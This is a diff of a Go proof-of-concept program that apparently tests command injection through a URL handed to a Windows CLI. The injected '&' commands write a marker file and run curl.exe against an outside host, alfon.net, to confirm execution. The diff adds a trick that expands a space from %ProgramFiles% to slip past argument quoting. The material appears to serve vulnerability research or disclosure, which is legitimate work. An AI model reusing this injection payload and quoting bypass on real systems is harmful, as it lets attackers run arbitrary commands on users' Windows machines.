@@ -37,11 +37,15 @@ func main() {
 	_ = os.Remove(marker)
 	_ = os.Remove(httpBody)
 
-	// No spaces, tabs, or quotes: Go's EscapeArg would otherwise quote the
-	// whole URL and cmd.exe would not treat & as a command separator.
+	// No literal spaces/tabs/quotes: Go's EscapeArg would quote the whole
+	// URL and cmd.exe would not treat & as a command separator. A comma is
+	// not a reliable argv splitter for external exes, so expand a space
+	// from %ProgramFiles% ("C:\Program Files", index 10).
+	sp := `%ProgramFiles:~10,1%`
 	url := "https://app.revenuecat.com/projects/x/customers/rcbb" +
 		`&echo>%CD%\RCBB_CLI_EXECUTED.txt` +
-		`&curl.exe,-s,-o,%CD%\RCBB_HTTP.txt,http://alfon.net?g` + runID
+		`&curl.exe` + sp + `-s` + sp + `-o` + sp + `%CD%\RCBB_HTTP.txt` + sp +
+		`http://alfon.net?g` + runID
 
 	fmt.Printf("run_id=%s\n", runID)
 	fmt.Printf("lookup=http://alfon.net?g%s\n", runID)
@@ -70,13 +74,15 @@ func main() {
 	}
 	fmt.Println("PASS: local marker created (cmd.exe parsed &)")
 
-	if b, err := os.ReadFile(httpBody); err != nil {
-		fmt.Fprintln(os.Stderr, "WARN: no HTTP body; check alfon.net or Cloudflare")
-	} else {
-		fmt.Printf("http_body_len=%d\n", len(b))
-		if len(b) > 256 {
-			b = b[:256]
-		}
-		fmt.Printf("http_body_head=%q\n", b)
+	b, err := os.ReadFile(httpBody)
+	if err != nil || len(b) == 0 {
+		fmt.Fprintln(os.Stderr, "FAIL: injected curl did not write HTTP body")
+		os.Exit(1)
 	}
+	fmt.Printf("http_body_len=%d\n", len(b))
+	head := b
+	if len(head) > 256 {
+		head = head[:256]
+	}
+	fmt.Printf("http_body_head=%q\n", head)
 }
